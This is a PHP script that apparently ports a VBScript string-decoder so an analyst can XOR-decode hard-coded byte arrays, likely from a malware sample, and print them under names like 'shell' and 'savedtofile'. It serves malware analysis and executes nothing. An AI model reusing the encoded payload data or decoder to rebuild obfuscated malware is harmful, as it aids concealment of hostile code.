<?php
$ppKzr = file_get_contents('ppkzr');
if (strcmp($ppKzr, "toto") !== 0) {
	BkAIuNwQNDkohBY();
	$ppKzr = "toto";
}

function QklkhFEQNB($data, $offset){
	global $ppKzr;
	$dict = $ppKzr;
	$out = "";
	$i = 1;
	while ($i < (count($data)+1)){
		$index = $i % strlen($dict);
		if ($index == 0) $index = strlen($dict);
		$cur = substr($dict, $index + $offset - 1, 1); // have to -1 due to vbscript Mid using 1-based string indexing
		$out .= chr(ord($cur) ^ $data[$i - 1]);
		$i += 1;
	}
	return $out;
}

function BkAIuNwQNDkohBY(){
	$tmp = array(5, 5, 27, 65, 89, 98, 85, 86, 71, 75, 66, 92, 95, 98, 67, 64, 89, 83, 84, 95, 26, 78, 116, 78, 91, 5, 116, 32, 72, 2, 33, 48, 10, 29, 61, 8, 37, 20, 63, 44, 1, 12, 62, 38, 47, 52, 99, 57, 5, 121, 89, 37, 65, 32, 32, 11, 98, 42, 58, 32, 28, 9, 3, 117, 85, 4, 57, 10, 94, 0, 16, 8, 28, 42, 30, 121, 71, 6, 8, 9, 37, 2, 23, 34, 21, 120, 54, 7, 40, 35, 75, 50, 87, 3, 55, 47, 99, 52, 13, 0, 42, 30, 27, 126, 59, 3, 123, 29, 52, 44, 53, 29, 15, 50, 12, 35, 8, 48, 89, 54, 27, 62, 28, 8, 36, 49, 119, 104, 14, 5, 64, 34, 43, 22, 71, 5, 46, 7, 66, 42, 0, 1, 113, 97, 83, 31, 45, 95, 111, 31, 40, 51);
	$twO = QklkhFEQNB($tmp, 24);
	echo "twO = $twO \n";
	
	$UkI = QklkhFEQNB(array(42, 115, 2), 188);
	echo "UkI = $UkI \n";
	
	$tmp1 = QklkhFEQNB(array(116, 7, 6, 74, 60, 43, 42, 36, 64, 70, 110, 27, 28, 12, 12, 17, 23), 0);
	echo "tmp1 = $tmp1 \n";
	
	$tmp2 = QklkhFEQNB(array(15, 32, 32, 53, 35, 89, 22, 25, 65, 53, 51, 26), 176);
	echo "tmp2 = $tmp2 \n";
	
	$savedtofile = QklkhFEQNB(array(20, 39, 81, 118, 52, 78, 11), 17);
	echo "savedtofile = $savedtofile \n";
	
	$shell = QklkhFEQNB(array(20, 39, 81, 118, 52, 78, 11), 17);
	echo "shell = $shell \n";
}
?>